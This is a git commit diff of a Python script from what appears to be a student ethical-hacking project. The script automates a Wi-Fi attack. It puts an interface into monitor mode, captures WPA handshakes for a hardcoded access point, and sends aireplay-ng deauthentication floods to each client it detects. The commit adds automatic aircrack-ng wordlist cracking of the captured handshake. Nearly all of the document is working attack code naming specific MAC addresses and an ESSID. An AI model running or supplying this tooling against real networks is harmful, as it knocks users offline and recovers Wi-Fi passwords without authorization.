be4c2b22836d36c10297abedc03e4f85bca15940
root <root@localhost.localdomain>
2018-04-25 14:32:21 -0500

    test2 works most of the time

--- test2.py
+++ test2.py
@@ -5,13 +5,16 @@ from __future__ import print_function
 import os, subprocess, select, time
 from multiprocessing import Process
 
-SECONDS = 9 
+SECONDS = 20
 BSSID = {
     "BSSID": "98:DE:D0:21:12:0F",
     "CH": "9",
     "ESSID": "TP-LINK_120F",
 }
 DMAC = "30:3A:64:B0:8B:EB"
+#DMAC = "5C:70:A3:46:2A:30"
+#WORDLIST = "/usr/share/wordlists/rockyou.txt"
+WORDLIST = "/root/Documents/cs378/ethical_hacking_final_project/test.txt"
 
 def setup_network():
 
@@ -39,15 +42,10 @@ def setup_network():
     return mon_managed
 
 def reset_network(interface_name):
-    #print("Reseting network...")
     out = subprocess.check_output("airmon-ng stop {}".format(interface_name).split(" "))
-    #print(out)
     out = subprocess.check_output("service network-manager restart".split(" "))
-    #print(out)
-    #print("Reset Network")
 
 def send_deauth(bssid, dmac, interface_name, seconds):
-    print("SECONDS: {}".format(seconds))
     print("sending {0} deauth(s) to DMAC:{1} in BSSID:{2}".format(seconds, dmac, bssid["BSSID"]))
     print("aireplay-ng -0 {0} -a {1} -c {2} {3}".format(seconds, bssid["BSSID"], dmac, interface_name))
     #aireplay-ng -0 1 -a <bssid - MAC address of access point> -c <dmac - MAC address of destination> <monitor mode adapter>
@@ -58,15 +56,31 @@ def send_deauth(bssid, dmac, interface_name, seconds):
     #p.wait()
     #print(out, err)
 
+def crack_password(wordlist, bssid, pcap_file):
+    p = subprocess.Popen("aircrack-ng -w {0} -b {1} {2}".format(wordlist, bssid["BSSID"], pcap_file).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    out, err = p.communicate()
+    p.wait()
+    #print(out, err)
+    #print(out.split("\n"))
+    #print(out)
+    data = out.split("\n")
+    if len(data) < 7:
+        print("Did not find password for BSSID:{0}\t ESSID: {1}".format(bssid["BSSID"], bssid["ESSID"]))
+    else:
+        for d in data:
+            if "KEY FOUND" in d:
+                #print("Password for BSSID:{0}\t ESSID:{1} is {2}".format(bssid["BSSID"], bssid["ESSID"], d))
+                print(out)
+                break
+
 def capture_handshake(bssid, interface_name):
     out = subprocess.check_output("airmon-ng start {0} {1}".format(interface_name, 9).split(" "))
     print("Capturing packets for {0} on channel {1} [BSSID: {2}]..."\
             .format(bssid["ESSID"], bssid["CH"], bssid["BSSID"]))
-    print("airodump-ng -c {0} --bssid {1} -w handshake {2}".format(bssid["CH"], bssid["BSSID"], interface_name))
+    print("airodump-ng -c {0} --bssid {1} -w handshake_{1} {2}".format(bssid["CH"], bssid["BSSID"], interface_name))
     #os.system("airodump-ng --bssid %s --channel %s -w captured_packet %s" %(bssid["BSSID"], bssid["CH"], interface_name))
-    p = subprocess.Popen("airodump-ng -c {0} --bssid {1} -w handshake {2}"\
+    p = subprocess.Popen("airodump-ng -c {0} --bssid {1} -w handshake_{1} {2}"\
             .format(bssid["CH"], bssid["BSSID"], interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    """
     dmac_map = {}
     processes = []
     poll = select.poll()
@@ -101,16 +115,19 @@ def capture_handshake(bssid, interface_name):
             if dmac not in dmac_map:
                 print("new dmac: {}".format(dmac))
                 dmac_map[dmac] = True
+                """
+                dmac_map[dmac] = True
                 deauth = Process(target = send_deauth, args=(bssid, dmac, interface_name, SECONDS))
                 processes.append(deauth)
                 deauth.start()
                 deauth.join()
+                """
+                send_deauth(bssid, dmac, interface_name, SECONDS)
     #print(out2arr)
-    """
     #deauth = Process(target = send_deauth, args=(bssid, DMAC, interface_name, SECONDS))
     #deauth.start()
     #deauth.join()
-    send_deauth(bssid, DMAC, interface_name, SECONDS)
+    #send_deauth(bssid, DMAC, interface_name, SECONDS)
 
     """
     print('deauthing', end='')
@@ -132,6 +149,10 @@ def capture_handshake(bssid, interface_name):
     """
 
     p.terminate()
+
+    file_name = "handshake_{0}-01.cap".format(bssid["BSSID"])
+    pwd = Process(target=crack_password, args=(WORDLIST, bssid, file_name))
+    pwd.start()
 
 if __name__ == "__main__":
     os.system("rm testcap*")
